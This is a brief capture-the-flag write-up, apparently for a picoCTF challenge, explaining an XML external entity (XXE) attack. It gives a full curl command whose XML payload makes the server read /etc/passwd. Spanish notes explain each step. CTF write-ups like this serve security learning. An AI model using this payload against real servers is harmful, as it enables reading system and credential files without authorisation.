
## DESCRIPCION
- The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## SOLUCION
```

curl -X POST "http://saturn.picoctf.net:57789/data" \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>'
     
```

## NOTAS ADICIONALES
- Envie una petición **POST** con `curl`.
- Indique que el contenido enviado era **XML**.
- Dentro del XML cree una entidad externa llamada `xxe`.
- Hice que esa entidad apuntara al archivo `/etc/passwd` del servidor.
- Después utilice `&xxe;` dentro del XML para intentar que el servidor sustituyera esa referencia por el contenido del archivo.
- El objetivo era comprobar si el **parser XML del servidor era vulnerable a XXE** y, en consecuencia, podía revelar información del sistema.

## REFERENCIAS
- Gemini IA